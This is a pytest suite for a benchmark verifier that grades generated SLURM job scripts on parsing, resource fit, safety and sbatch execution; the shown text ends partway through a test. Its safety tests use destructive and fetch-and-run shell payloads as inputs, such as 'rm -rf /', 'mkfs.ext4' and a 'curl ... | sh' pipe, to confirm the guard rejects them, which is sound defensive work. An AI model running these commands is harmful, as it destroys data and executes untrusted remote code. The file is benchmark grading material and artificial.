"""Verifier tests.

Guiding principle: the verifier must promote the oracle and reject defects.
A test that never fails on a broken script is not testing anything.
"""

from __future__ import annotations

import json
import math
from pathlib import Path

import pytest

from anvil.device import classify_coreutils
from anvil.metrics import pass_at_k
from anvil.models import BrokenModel, OracleModel
from anvil.parse import (
    extract_script,
    misplaced_directives,
    parse_directives,
    parse_mem_to_mb,
    parse_time_to_minutes,
)
from anvil.schema import Level, Task
from anvil.verifier import (
    check_resource_fit,
    check_safety,
    check_syntax,
    verify,
)

ROOT = Path(__file__).resolve().parents[1]
TASKS = ROOT / "tasks" / "t1_slurm.jsonl"
REFS = ROOT / "tasks" / "t1_reference.jsonl"

GOOD = """#!/bin/bash
#SBATCH --job-name=hello
#SBATCH --nodes=1
#SBATCH --ntasks=1
#SBATCH --time=00:10:00
#SBATCH --mem=512M

echo ANVIL_OK
"""


# ---------------------------------------------------------------- parsing
def test_extract_script_from_fence():
    raw = "Sure!\n```bash\n#!/bin/bash\necho hi\n```\nHope it helps."
    assert extract_script(raw) == "#!/bin/bash\necho hi"


def test_extract_script_picks_the_job_script():
    raw = "```\nnot a job\n```\n```bash\n#SBATCH --time=1\n```"
    assert "#SBATCH" in extract_script(raw)


def test_extract_script_without_fence():
    assert extract_script("#!/bin/bash\necho hi") == "#!/bin/bash\necho hi"


@pytest.mark.parametrize(
    ("value", "minutes"),
    [("30", 30), ("30:00", 30), ("01:30:00", 90), ("2-00", 2880), ("1-02:30", 1590)],
)
def test_parse_time(value, minutes):
    assert parse_time_to_minutes(value) == minutes


def test_parse_time_invalid():
    assert parse_time_to_minutes("banana") is None


@pytest.mark.parametrize(
    ("value", "mb"), [("512M", 512), ("2G", 2048), ("1024", 1024), ("1T", 1048576)]
)
def test_parse_mem(value, mb):
    assert parse_mem_to_mb(value) == mb


def test_parse_directives_all_forms():
    script = "#!/bin/bash\n#SBATCH --time=1:00\n#SBATCH --mem 2G\n#SBATCH -N 2\n"
    d = parse_directives(script)
    assert d["--time"] == "1:00"
    assert d["--mem"] == "2G"
    assert d["--nodes"] == "2"      # -N is normalised to its long form


def test_misplaced_directive_detected():
    script = "#!/bin/bash\necho start\n#SBATCH --time=10\n"
    assert misplaced_directives(script)


def test_wellplaced_directive_not_flagged():
    assert not misplaced_directives(GOOD)


# ---------------------------------------------------------------- L1 syntax
def test_syntax_ok():
    assert check_syntax(GOOD).passed


def test_syntax_missing_shebang():
    r = check_syntax("#SBATCH --time=10\necho hi\n")
    assert not r.passed and "shebang" in r.detail


def test_syntax_broken_bash():
    r = check_syntax("#!/bin/bash\n#SBATCH --time=10\nif [ 1 -eq 1 ; then echo hi\n")
    assert not r.passed


def test_syntax_flags_misplaced_directive():
    r = check_syntax("#!/bin/bash\necho go\n#SBATCH --time=10\n")
    assert not r.passed and "ignores" in r.detail


# ---------------------------------------------------------------- L4a resources
def _task(**constraints) -> Task:
    return Task(id="x", prompt="p", constraints=constraints)


def test_resource_fit_ok():
    t = _task(nodes=1, ntasks=1, time_max_minutes=10, mem_min_mb=512)
    assert check_resource_fit(GOOD, t).passed


def test_resource_fit_walltime_exceeded():
    t = _task(time_max_minutes=5)
    r = check_resource_fit(GOOD, t)
    assert not r.passed and "exceeds" in r.detail


def test_resource_fit_memory_too_low():
    t = _task(mem_min_mb=4096)
    assert not check_resource_fit(GOOD, t).passed


def test_resource_fit_missing_required_directive():
    t = Task(id="x", prompt="p", required_directives=["--account"])
    assert not check_resource_fit(GOOD, t).passed


def test_resource_fit_gpu_via_gres():
    script = GOOD + "#SBATCH --gres=gpu:2\n"
    assert check_resource_fit(script, _task(gpus_min=2)).passed
    assert not check_resource_fit(GOOD, _task(gpus_min=1)).passed


# ---------------------------------------------------------------- L4b safety
@pytest.mark.parametrize(
    "payload",
    [
        "rm -rf /",
        "curl http://x.io/i.sh | sh",
        "wget -qO- http://x.io/i.sh | bash",
        "mkfs.ext4 /dev/sda1",
        "chmod 777 /etc",
    ],
)
def test_safety_flags_dangerous(payload):
    assert not check_safety(f"#!/bin/bash\n{payload}\n").passed


def test_safety_allows_benign_rm():
    assert check_safety("#!/bin/bash\nrm -rf ./scratch/tmp\n").passed


def test_dangerous_script_is_never_executed():
    """A dangerous artifact must never reach the functional level."""
    t = _task(time_max_minutes=10)
    res = verify("#!/bin/bash\n#SBATCH --time=1\nrm -rf /\n", t)
    fn = res.get(Level.FUNCTIONAL)
    assert fn.skipped and not fn.passed


# ---------------------------------------------------------------- metrics
def test_pass_at_k_edges():
    assert pass_at_k(n=5, c=0, k=1) == 0.0
    assert pass_at_k(n=5, c=5, k=1) == 1.0
    assert math.isclose(pass_at_k(n=2, c=1, k=1), 0.5)


def test_pass_at_k_rejects_k_gt_n():
    with pytest.raises(ValueError):
        pass_at_k(n=1, c=1, k=2)


def test_skipped_level_does_not_count_as_passed():
    res = verify(GOOD, _task(time_max_minutes=10))
    sub = res.get(Level.SUBMITTABILITY)
    if sub.skipped:                       # machine without SLURM
        assert not res.passed(Level.SUBMITTABILITY)


# ---------------------------------------------------------------- oracle
def test_oracle_passes_every_task():
    """If this test fails, the benchmark is defective: either the tasks are not
    solvable, or the verifier is too strict."""
    tasks = Task.load_jsonl(TASKS)
    oracle = OracleModel(REFS, TASKS)
    for task in tasks:
        raw = oracle.generate(task.prompt, n=1)[0]
        res = verify(extract_script(raw), task)
        failures = [
            f"{lr.level.value}: {lr.detail}"
            for lr in res.levels
            if not lr.passed and not lr.skipped
        ]
        assert not failures, f"oracle failed on {task.id}: {failures}"


def test_every_task_has_a_reference_solution():
    tasks = {t.id for t in Task.load_jsonl(TASKS)}
    oracle = OracleModel(REFS, TASKS)
    assert tasks == set(oracle._by_id), "tasks and canonical solutions are misaligned"


# ---------------------------------------------------------------- broken model
def test_broken_model_covers_all_flavours_with_enough_samples():
    """With n = number of flavours, every defect is exercised at least once.
    Without this, the `safety` guard was NEVER put to the test."""
    bm = BrokenModel()
    n = len(BrokenModel.FLAVOURS)
    outs = {extract_script(o) for o in bm.generate("qualsiasi prompt", n=n)}
    assert len(outs) == n, f"expected {n} distinct flavours, got {len(outs)}"


def test_broken_model_varies_across_tasks():
    """Different tasks must receive different defects: otherwise coverage depends
    on chance and some verifier dimensions stay untested."""
    bm = BrokenModel()
    prompts = ("task one", "task two", "task three")
    first = [extract_script(bm.generate(p, n=1, seed=0)[0]) for p in prompts]
    assert len(set(first)) > 1, "every task receives the same defect"


def test_broken_model_is_deterministic():
    bm = BrokenModel()
    a = bm.generate("same prompt", n=3, seed=42)
    b = bm.generate("same prompt", n=3, seed=42)
    assert a == b


def test_broken_model_trips_safety():
    """The destructive flavour MUST exist and be reachable."""
    bm = BrokenModel()
    scripts = [extract_script(o) for o in bm.generate("p", n=len(BrokenModel.FLAVOURS))]
    unsafe = [s for s in scripts if not check_safety(s).passed]
    assert unsafe, "no flavour triggers check_safety: the guard is untested"


def test_broken_model_fails_every_dimension_somewhere():
    """Every verifier level must be failed by at least one flavour: this is what
    makes the broken model a useful guard."""
    task = _task(nodes=1, ntasks=1, time_max_minutes=10, mem_min_mb=512)
    bm = BrokenModel()
    results = [
        verify(extract_script(o), task)
        for o in bm.generate("p", n=len(BrokenModel.FLAVOURS))
    ]
    for level in (Level.SYNTAX, Level.RESOURCE_FIT, Level.SAFETY):
        assert any(not r.passed(level) for r in results), f"no flavour fails {level.value}"


# ---------------------------------------------------------------- shell environment
@pytest.mark.parametrize(
    ("line", "expect"),
    [
        ("ls (GNU coreutils) 9.4", "GNU coreutils"),          # Ubuntu 24.04, RHEL, clusters
        ("ls (uutils coreutils) 0.0.30", "NOT GNU"),          # Ubuntu 26.04 "Resolute Raccoon"
        ("uu_ls 0.1.0", "NOT GNU"),                           # alternate binary name
        ("BusyBox v1.36.1 (2024-01-01)", "NOT GNU"),          # Alpine
        ("", "BSD"),                                          # macOS: `ls --version` absent
    ],
)
def test_classify_coreutils(line, expect):
    assert expect in classify_coreutils(line)


def test_only_gnu_is_considered_faithful():
    """Faithfulness is a MEASUREMENT, not an assumption about the platform.
    Ubuntu 26.04 has the right name and the wrong coreutils."""
    assert "GNU coreutils" in classify_coreutils("ls (GNU coreutils) 9.4")
    for impostor in ("ls (uutils coreutils) 0.0.30", "BusyBox v1.36.1", ""):
        assert "GNU coreutils" not in classify_coreutils(impostor)


# ---------------------------------------------------------------- preflight
def test_preflight_is_cached(monkeypatch):
    import anvil.verifier as v

    v._health = None
    calls = []

    def fake_run(cmd, **kw):
        calls.append(cmd)
        class R:
            returncode = 0
            stdout = stderr = ""
        return R()

    monkeypatch.setattr(v.shutil, "which", lambda _: "/usr/bin/sbatch")
    monkeypatch.setattr(v.subprocess, "run", fake_run)
    assert v.slurm_healthy(force=True)[0]
    submitted = len(calls)
    assert submitted == 2, "one minimal canary, then one asking for the declared topology"
    assert v.slurm_healthy()[0]
    assert len(calls) == submitted, "the preflight must run once per process and be cached"
    v._health = None


def test_broken_cluster_skips_submittability_instead_of_failing(monkeypatch):
    """A misconfigured scheduler must NOT produce model failures. Eight zeros on
    `submittability` would be indistinguishable from a terrible model."""
    import anvil.verifier as v

    v._health = None
    monkeypatch.setattr(v, "slurm_healthy", lambda force=False: (False, "broken cluster"))
    r = v.check_submittability(GOOD)
    assert r.skipped and not r.passed
    assert "broken cluster" in r.detail
    v._health = None


def test_healthy_cluster_runs_submittability(monkeypatch):
    import anvil.verifier as v

    v._health = None
    monkeypatch.setattr(v, "slurm_healthy", lambda force=False: (True, "ok"))

    class R:
        returncode = 0
        stdout = "Job would be scheduled"
        stderr = ""

    monkeypatch.setattr(v.subprocess, "run", lambda *a, **k: R())
    r = v.check_submittability(GOOD)
    assert r.passed and not r.skipped
    v._health = None


# ------------------------------------------------- L4a: SLURM defaults
# Discovered by running a real 1.5B model: it omitted --nodes on a task asking
# for one node. SLURM defaults --nodes to 1, so the script was CORRECT and
# `sbatch --test-only` accepted it - yet Anvil failed it. The verifier was
# checking for the presence of a string instead of the effective request:
# surface-form matching, the very thing this benchmark exists to replace.

_NO_NODES = """#!/bin/bash
#SBATCH --job-name=hello
#SBATCH --time=00:10:00
#SBATCH --mem=512M

echo ANVIL_OK
"""


def test_omitted_nodes_uses_slurm_default_of_one():
    """A serial script without --nodes effectively requests 1 node: correct."""
    t = _task(nodes=1, ntasks=1, time_max_minutes=10, mem_min_mb=512)
    r = check_resource_fit(_NO_NODES, t)
    assert r.passed, r.detail


def test_omitted_nodes_still_fails_when_more_are_required():
    t = _task(nodes=2)
    r = check_resource_fit(_NO_NODES, t)
    assert not r.passed and "effective 1" in r.detail


def test_ntasks_defaults_to_one_task_per_node():
    """SLURM's default is one task per node, not one task overall."""
    script = "#!/bin/bash\n#SBATCH --nodes=2\n#SBATCH --time=00:10:00\nsrun hostname\n"
    assert check_resource_fit(script, _task(nodes=2, ntasks=2)).passed
    assert not check_resource_fit(script, _task(nodes=2, ntasks=4)).passed


def test_omitted_cpus_per_task_defaults_to_one():
    assert check_resource_fit(_NO_NODES, _task(cpus_per_task=1)).passed
    assert not check_resource_fit(_NO_NODES, _task(cpus_per_task=4)).passed


def test_detail_marks_implicit_values():
    """The report must say the value came from a default, not from the script."""
    r = check_resource_fit(_NO_NODES, _task(nodes=2))
    assert "SLURM default, not declared" in r.detail


@pytest.mark.parametrize("constraint", [{"time_max_minutes": 10}, {"mem_min_mb": 512}])
def test_directives_without_universal_default_must_be_declared(constraint):
    """--time and --mem depend on partition config: omitting them means the
    resource was never requested. Absence is a genuine failure here."""
    bare = "#!/bin/bash\n#SBATCH --job-name=x\necho hi\n"
    r = check_resource_fit(bare, _task(**constraint))
    assert not r.passed and "not requested" in r.detail


def test_required_directives_still_force_explicitness():
    """Defaults do not weaken the benchmark: a task may still demand the
    directive be written out."""
    t = Task(id="x", prompt="p", constraints={"nodes": 1},
             required_directives=["--nodes"])
    assert not check_resource_fit(_NO_NODES, t).passed


def test_gpus_absent_is_a_failure_not_a_default():
    assert not check_resource_fit(_NO_NODES, _task(gpus_min=1)).passed


# ------------------------------------------------- macOS coreutils detection
def test_bsd_ls_error_is_classified_as_bsd_not_unknown():
    """macOS `ls --version` prints an illegal-option error, not nothing.
    Mislabelling it 'unknown' would corrupt the environment report."""
    bsd_outputs = ("ls: illegal option -- -", "usage: ls [-@ABCFGHILOPRSTUW]")
    for line in bsd_outputs:
        assert "BSD" in classify_coreutils(line)
    assert "BSD" in classify_coreutils("")


# ------------------------------------------------- coreutils: behaviour, not wording
# Third time the same mistake: matching a STRING instead of checking BEHAVIOUR.
# BSD/BusyBox reject `--version` with at least four different messages; the exit
# code is the invariant.
@pytest.mark.parametrize(
    "message",
    [
        "ls: illegal option -- -",
        "ls: unrecognized option: --version",
        "ls: unrecognized option `--version'",
        "ls: invalid option -- '-'",
        "usage: ls [-@ABCFGHILOPRSTUW]",
        "",
    ],
)
def test_nonzero_exit_means_not_gnu_whatever_the_wording(message):
    """The exit code decides. The message only disambiguates among the
    implementations that DO support --version."""
    got = classify_coreutils(message, supports_version=False, system="Darwin")
    assert "BSD" in got
    assert "GNU coreutils" not in got


def test_nonzero_exit_on_linux_is_not_labelled_bsd():
    got = classify_coreutils("ls: unrecognized option", supports_version=False, system="Linux")
    assert "non-GNU" in got and "BSD" not in got


def test_zero_exit_disambiguates_implementations():
    assert "GNU coreutils" in classify_coreutils("ls (GNU coreutils) 9.4", supports_version=True)
    assert "NOT GNU" in classify_coreutils("ls (uutils coreutils) 0.0.30", supports_version=True)
    assert "NOT GNU" in classify_coreutils("BusyBox v1.36.1", supports_version=True)


# ------------------------------------------------- generate / verify decoupling
def test_run_then_verify_gives_identical_summaries(tmp_path):
    """Generation needs the accelerator; faithful verification needs the scheduler.
    Splitting them must not change a single number."""
    from anvil.cli import main

    gen = tmp_path / "gen.jsonl"
    run_out = tmp_path / "run.json"
    ver_out = tmp_path / "ver.json"

    assert main(["run", "--model", "oracle", "--tasks", str(TASKS),
                 "--save-generations", str(gen), "--out", str(run_out)]) == 0
    assert main(["verify", "--generations", str(gen), "--tasks", str(TASKS),
                 "--out", str(ver_out)]) == 0

    a = json.loads(run_out.read_text())["summary"]
    b = json.loads(ver_out.read_text())["summary"]
    assert a == b


def test_generations_file_is_one_script_per_sample(tmp_path):
    from anvil.cli import main

    gen = tmp_path / "gen.jsonl"
    main(["run", "--model", "broken", "--tasks", str(TASKS), "-n", "3",
          "--save-generations", str(gen)])
    records = [json.loads(line) for line in gen.read_text().splitlines() if line.strip()]
    n_tasks = len(Task.load_jsonl(TASKS))
    assert len(records) == n_tasks * 3
    assert {r["sample"] for r in records} == {0, 1, 2}
    assert all(r["script"].strip() for r in records)


def test_verify_records_the_environment(tmp_path):
    """Which bash, which coreutils, which base image produced each number."""
    from anvil.cli import main

    gen = tmp_path / "gen.jsonl"
    out = tmp_path / "ver.json"
    main(["run", "--model", "oracle", "--tasks", str(TASKS), "--save-generations", str(gen)])
    main(["verify", "--generations", str(gen), "--tasks", str(TASKS), "--out", str(out)])

    env = json.loads(out.read_text())["environment"]
    for key in ("bash", "coreutils", "gnu_faithful", "base_image", "functional_executor"):
        assert key in env


def test_verify_warns_on_unknown_task_ids(tmp_path, capsys):
    from anvil.cli import main

    gen = tmp_path / "gen.jsonl"
    gen.write_text(json.dumps({"task_id": "does_not_exist", "sample": 0,
                               "model": "x", "seed": 0, "script": "#!/bin/bash\necho hi\n"}) + "\n")
    rc = main(["verify", "--generations", str(gen), "--tasks", str(TASKS)])
    assert rc == 1                       # nothing verified
    assert "unknown task ids" in capsys.readouterr().err


# ------------------------------------------------- multi-option #SBATCH lines
# Found by a real run: the container's scheduler reported "Invalid --time
# specification" while Anvil reported "--time missing". Both cannot be right.
# SLURM parses a #SBATCH line like a command line: several options are legal.
# Reading only the first swallowed the rest - another false negative from
# surface-form parsing.
def test_multiple_options_on_one_sbatch_line():
    script = "#!/bin/bash\n#SBATCH --ntasks=1 --time=00:01:00 --mem=512M\necho hi\n"
    d = parse_directives(script)
    assert d["--ntasks"] == "1"
    assert d["--time"] == "00:01:00"
    assert d["--mem"] == "512M"


def test_multi_option_line_satisfies_resource_fit():
    """The regression this bug caused: a correct script scored as missing --time."""
    script = "#!/bin/bash\n#SBATCH --ntasks=1 --time=00:05:00 --mem=1G\necho ANVIL_OK\n"
    t = Task(id="x", prompt="p",
             constraints={"ntasks": 1, "time_max_minutes": 10, "mem_min_mb": 512},
             required_directives=["--time"])
    r = check_resource_fit(script, t)
    assert r.passed, r.detail


@pytest.mark.parametrize(
    ("short", "long_", "value"),
    [("-t", "--time", "00:10:00"), ("-N", "--nodes", "2"),
     ("-n", "--ntasks", "4"), ("-c", "--cpus-per-task", "8"),
     ("-J", "--job-name", "x"), ("-a", "--array", "1-5")],
)
def test_short_options_normalise_to_long(short, long_, value):
    """`-t` IS `--time`. Demanding the long spelling measures style, not correctness."""
    d = parse_directives(f"#!/bin/bash\n#SBATCH {short} {value}\necho hi\n")
    assert d[long_] == value


def test_short_option_with_attached_value():
    assert parse_directives("#!/bin/bash\n#SBATCH -c4\n")["--cpus-per-task"] == "4"


def test_required_directive_accepts_the_short_form():
    script = "#!/bin/bash\n#SBATCH -t 00:05:00\necho hi\n"
    t = Task(id="x", prompt="p", required_directives=["--time"])
    assert check_resource_fit(script, t).passed


def test_flag_without_value_does_not_eat_the_next_option():
    d = parse_directives("#!/bin/bash\n#SBATCH --exclusive --time=00:10:00\n")
    assert d["--exclusive"] == "" and d["--time"] == "00:10:00"


def test_quoted_value_survives():
    d = parse_directives('#!/bin/bash\n#SBATCH --job-name="my job" --time=00:05:00\n')
    assert d["--job-name"] == "my job" and d["--time"] == "00:05:00"


def test_trailing_comment_is_stripped():
    d = parse_directives("#!/bin/bash\n#SBATCH --time=00:10:00  # ten minutes\n")
    assert d["--time"] == "00:10:00"


# ------------------------------------------------- stale generations guard
# `make generate` once failed halfway (wrong interpreter, no transformers) and
# `make docker-verify` happily verified a leftover file, saying nothing. If the
# task set had changed, the scores would have answered questions never asked.
def test_generations_carry_the_task_file_digest(tmp_path):
    from anvil.cli import main

    gen = tmp_path / "gen.jsonl"
    main(["run", "--model", "oracle", "--tasks", str(TASKS), "--save-generations", str(gen)])
    records = [json.loads(line) for line in gen.read_text().splitlines() if line.strip()]
    assert all(r["tasks_sha"] for r in records)
    assert len({r["tasks_sha"] for r in records}) == 1


def test_verify_refuses_generations_from_a_different_task_file(tmp_path, capsys):
    from anvil.cli import main

    gen = tmp_path / "gen.jsonl"
    main(["run", "--model", "oracle", "--tasks", str(TASKS), "--save-generations", str(gen)])

    altered = tmp_path / "altered.jsonl"
    altered.write_text(TASKS.read_text() + json.dumps(
        {"id": "extra", "prompt": "p", "constraints": {}}) + "\n")

    rc = main(["verify", "--generations", str(gen), "--tasks", str(altered)])
    assert rc == 2
    assert "different task file" in capsys.readouterr().err


def test_verify_accepts_generations_from_the_same_task_file(tmp_path):
    from anvil.cli import main

    gen = tmp_path / "gen.jsonl"
    main(["run", "--model", "oracle", "--tasks", str(TASKS), "--save-generations", str(gen)])
    assert main(["verify", "--generations", str(gen), "--tasks", str(TASKS)]) == 0


def test_legacy_generations_without_a_digest_are_refused(tmp_path, capsys):
    """Old files predate the guard. Silently accepting them defeats its purpose."""
    from anvil.cli import main

    gen = tmp_path / "old.jsonl"
    gen.write_text(json.dumps({
        "task_id": "t1_hello_serial", "sample": 0, "model": "x", "seed": 0,
        "script": "#!/bin/bash\n#SBATCH --time=00:10:00\necho ANVIL_OK\n",
    }) + "\n")
    rc = main(["verify", "--generations", str(gen), "--tasks", str(TASKS)])
    assert rc == 2
    assert "different task file" in capsys.readouterr().err


def test_verbose_line_reports_every_sample_not_just_the_last(capsys):
    """A task's verbose line must account for all n samples.

    It used to print `results[-1]`, so a task whose final draw happened to pass showed as
    clean while the earlier draws that failed went unmentioned. pass@k is computed over
    every sample, and the line people watch mid-run has to agree with it.
    """
    from anvil.cli import main

    main(["run", "--model", "broken", "--tasks", str(TASKS), "-n", "3", "-v"])
    out = capsys.readouterr().out

    task_lines = [ln for ln in out.splitlines() if ln.startswith("  t1_")]
    assert task_lines, "no per-task verbose lines were printed"
    for ln in task_lines:
        assert "/3 " in ln, f"line hides how many of the 3 samples passed: {ln!r}"


def test_verbose_line_keeps_its_single_sample_wording(capsys):
    """With one sample there is nothing to count, so the original wording stands."""
    from anvil.cli import main

    main(["run", "--model", "oracle", "--tasks", str(TASKS), "-n", "1", "-v"])
    out = capsys.readouterr().out

    assert "t1_hello_serial            PASS" in out
    assert "1/1 PASS" not in out


def test_failed_levels_carry_how_many_samples_they_failed_in(capsys):
    """Separates a systematic failure from one that only some draws hit."""
    from anvil.cli import main

    main(["run", "--model", "broken", "--tasks", str(TASKS), "-n", "3", "-v"])
    out = capsys.readouterr().out

    assert "(3/3 samples)" in out, "a level failing every sample should say so"
    assert "resource_fit" in out


# ------------------------------------------- L3 via sbatch: the real executor
# `functional` gained a second executor: bash in a sandbox (the default, and what every
# published number was measured with) and real submission through sbatch. The tests below
# cover the parts that need no scheduler, which is everything except the submission itself:
# the executor selection, the output files the job writes, the parsing of scontrol, and the
# mapping from a job's fate to a level result. That mapping is the part worth guarding,
# because it decides whether a failure is charged to the script or to the harness.
SBATCH_TASK = Task(
    id="t_sbatch", prompt="", constraints={}, expects_in_body=["ANVIL_OK"]
)


def _reference(task_id: str) -> str:
    for line in REFS.read_text(encoding="utf-8").splitlines():
        if line.strip():
            rec = json.loads(line)
            if rec["id"] == task_id:
                return rec["script"]
    raise AssertionError(f"no reference solution for {task_id}")


def test_executor_defaults_to_bash(monkeypatch):
    import anvil.verifier as v

    monkeypatch.delenv("ANVIL_FUNCTIONAL_EXECUTOR", raising=False)
    monkeypatch.setattr(v, "_executor_override", None)
    assert v.functional_executor() == "bash"


def test_environment_variable_selects_the_executor(monkeypatch):
    import anvil.verifier as v

    monkeypatch.setattr(v, "_executor_override", None)
    monkeypatch.setenv("ANVIL_FUNCTIONAL_EXECUTOR", "sbatch")
    assert v.functional_executor() == "sbatch"


def test_the_flag_wins_over_the_environment_variable(monkeypatch):
    import anvil.verifier as v

    monkeypatch.setattr(v, "_executor_override", None)
    monkeypatch.setenv("ANVIL_FUNCTIONAL_EXECUTOR", "sbatch")
    v.set_functional_executor("bash")
    assert v.functional_executor() == "bash"


def test_unknown_executor_is_refused(monkeypatch):
    """Silently falling back to bash would file a run under an executor nobody asked for."""
    import anvil.verifier as v

    monkeypatch.setattr(v, "_executor_override", None)
    monkeypatch.setenv("ANVIL_FUNCTIONAL_EXECUTOR", "srun")
    with pytest.raises(ValueError):
        v.functional_executor()


def test_environment_report_records_the_selected_executor(monkeypatch):
    import anvil.verifier as v
    from anvil.device import environment_report

    monkeypatch.setattr(v, "_executor_override", "sbatch")
    assert environment_report()["functional_executor"] == "sbatch"


def test_reference_output_directory_is_created_before_submission(tmp_path):
    """slurmstepd opens the file named by --output *before* the script's first command, so
    the `mkdir -p logs` inside the t1_output_paths reference solution is dead code under
    real submission: the job would fail to open logs/out_%j.txt and never start. Laying out
    the working directory is the submitter's job on a real cluster too."""
    import anvil.verifier as v

    v._prepare_output_dirs(_reference("t1_output_paths"), str(tmp_path))
    assert (tmp_path / "logs").is_dir()


def test_declared_output_and_error_files_are_both_read(tmp_path):
    import anvil.verifier as v

    script = (
        "#!/bin/bash\n#SBATCH --output=logs/out_%j.txt\n"
        "#SBATCH --error=logs/err_%j.txt\necho ANVIL_OK\n"
    )
    (tmp_path / "logs").mkdir()
    (tmp_path / "logs" / "out_77.txt").write_text("ANVIL_OK\n", encoding="utf-8")
    (tmp_path / "logs" / "err_77.txt").write_text("a warning\n", encoding="utf-8")

    got = v._read_job_output(script, str(tmp_path))
    assert "ANVIL_OK" in got and "a warning" in got


def test_every_array_task_output_is_read(tmp_path):
    """An array job writes one file per task. Reading only the first would let four of the
    five tasks fail unnoticed."""
    import anvil.verifier as v

    script = "#!/bin/bash\n#SBATCH --array=1-5\n#SBATCH --output=out_%A_%a.txt\necho hi\n"
    for idx in range(1, 6):
        (tmp_path / f"out_9_{idx}.txt").write_text(f"TASK={idx}\n", encoding="utf-8")

    got = v._read_job_output(script, str(tmp_path))
    assert all(f"TASK={idx}" in got for idx in range(1, 6))


def test_output_defaults_to_the_slurm_pattern(tmp_path):
    import anvil.verifier as v

    (tmp_path / "slurm-42.out").write_text("ANVIL_OK\n", encoding="utf-8")
    assert "ANVIL_OK" in v._read_job_output(GOOD, str(tmp_path))


def test_absolute_output_path_is_read_where_it_points(tmp_path):
    """A pattern that is already absolute must not be joined onto the sandbox."""
    import anvil.verifier as v

    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (elsewhere / "abs_5.out").write_text("ANVIL_OK\n", encoding="utf-8")
    script = f"#!/bin/bash\n#SBATCH --output={elsewhere}/abs_%j.out\necho hi\n"

    sandbox = tmp_path / "sandbox"
    sandbox.mkdir()
    assert "ANVIL_OK" in v._read_job_output(script, str(sandbox))


def test_scontrol_parses_one_record_per_array_task(monkeypatch):
    import anvil.verifier as v

    text = (
        "JobId=42_1 JobName=arr JobState=COMPLETED ExitCode=0:0 Reason=None "
        "Command=/tmp/job.sh\n"
        "JobId=42_2 JobName=arr JobState=FAILED ExitCode=1:0 Reason=NonZeroExitCode "
        "Command=/tmp/job.sh\n"
    )

    class R:
        returncode = 0
        stdout = text
        stderr = ""

    monkeypatch.setattr(v.subprocess, "run", lambda *a, **k: R())
    records = v._scontrol_job("42")
    assert [r["JobState"] for r in records] == ["COMPLETED", "FAILED"]
    assert records[1]["ExitCode"] == "1:0"


def test_scontrol_reports_nothing_for_an_expired_record(monkeypatch):
    import anvil.verifier as v

    class R:
        returncode = 1
        stdout = ""
        stderr = "slurm_load_jobs error: Invalid job id specified"

    monkeypatch.setattr(v.subprocess, "run", lambda *a, **k: R())
    assert v._scontrol_job("42") is None


def _await_with(monkeypatch, records):
    import anvil.verifier as v

    monkeypatch.setattr(v, "_scontrol_job", lambda job_id: records)
    return v


def test_a_dependency_that_can_never_clear_stops_the_poll_at_once(monkeypatch):
    """t1_dependency_chain asks for --dependency=afterok:12345, which the reference cluster
    satisfies at submit time with a held placeholder job. Held means it never completes, so
    waiting out the timeout would cost a minute per sample and report the same thing."""
    v = _await_with(
        monkeypatch, [{"JobId": "42", "JobState": "PENDING", "Reason": "Dependency"}]
    )
    assert v._await_job("42", timeout=600)[0] == "unplaceable"


def test_a_job_still_queued_at_the_timeout_is_pending_not_running(monkeypatch):
    v = _await_with(
        monkeypatch, [{"JobId": "42", "JobState": "PENDING", "Reason": "Resources"}]
    )
    assert v._await_job("42", timeout=0)[0] == "pending"


def test_one_array_task_still_running_is_not_done(monkeypatch):
    v = _await_with(monkeypatch, [
        {"JobId": "42_1", "JobState": "COMPLETED", "Reason": "None"},
        {"JobId": "42_2", "JobState": "RUNNING", "Reason": "None"},
    ])
    assert v._await_job("42", timeout=0)[0] == "running"


def test_a_mixed_array_counts_as_running_not_pending(monkeypatch):
    """Only a job entirely stuck in the queue is the scheduler's responsibility. If any task
    of the array reached a node, the timeout is about the payload and must not be skipped."""
    v = _await_with(monkeypatch, [
        {"JobId": "42_1", "JobState": "PENDING", "Reason": "Resources"},
        {"JobId": "42_2", "JobState": "RUNNING", "Reason": "None"},
    ])
    assert v._await_job("42", timeout=0)[0] == "running"


def test_all_terminal_states_end_the_poll(monkeypatch):
    v = _await_with(monkeypatch, [
        {"JobId": "42_1", "JobState": "COMPLETED", "Reason": "None"},
        {"JobId": "42_2", "JobState": "TIMEOUT", "Reason": "TimeLimit"},
    ])
    assert v._await_job("42", timeout=600)[0] == "done"


def test_an_expired_record_ends_the_poll(monkeypatch):
    import anvil.verifier as v

    monkeypatch.setattr(v, "_scontrol_job", lambda job_id: None)
    assert v._await_job("42", timeout=600)[0] == "gone"


def _sbatch_stub(monkeypatch, outcome, records, output=""):
    """Everything the sbatch executor needs except a scheduler."""
    import anvil.verifier as v

    monkeypatch.setattr(v, "_executor_override", "sbatch")
    monkeypatch.setattr(v, "sbatch_execution_healthy", lambda force=False: (True, "ok"))
    monkeypatch.setattr(v, "_submit", lambda script, workdir: ("42", ""))
    monkeypatch.setattr(v, "_await_job", lambda job_id, timeout: (outcome, records))
    monkeypatch.setattr(v, "_read_job_output", lambda script, workdir: output)
    monkeypatch.setattr(v, "_scancel", lambda job_id: None)
    return v


def test_a_scheduler_that_never_runs_jobs_skips_the_level(monkeypatch):
    """The failure mode this guards against was real: the verification image ran for months
    with no slurmd, printing `idle` nodes because SlurmdTimeout=0. Under this executor that
    would have failed every artifact and looked like a terrible model."""
    import anvil.verifier as v

    monkeypatch.setattr(v, "_executor_override", "sbatch")
    monkeypatch.setattr(
        v, "sbatch_execution_healthy", lambda force=False: (False, "no slurmd is running")
    )
    r = v.check_functional(GOOD, SBATCH_TASK)
    assert r.skipped and not r.passed
    assert "no slurmd is running" in r.detail


def test_an_unplaceable_job_is_skipped_not_failed(monkeypatch):
    v = _sbatch_stub(
        monkeypatch, "unplaceable",
        [{"JobId": "42", "JobState": "PENDING", "Reason": "DependencyNeverSatisfied"}],
    )
    r = v.check_functional(GOOD, SBATCH_TASK)
    assert r.skipped and not r.passed
    assert "DependencyNeverSatisfied" in r.detail


def test_a_job_still_pending_at_the_timeout_is_skipped_not_failed(monkeypatch):
    v = _sbatch_stub(
        monkeypatch, "pending", [{"JobId": "42", "JobState": "PENDING", "Reason": "Resources"}]
    )
    r = v.check_functional(GOOD, SBATCH_TASK)
    assert r.skipped and not r.passed


def test_a_job_still_running_at_the_timeout_fails(monkeypatch):
    """Unlike a queued job, one that is executing is a statement about the script."""
    v = _sbatch_stub(
        monkeypatch, "running", [{"JobId": "42", "JobState": "RUNNING", "Reason": "None"}]
    )
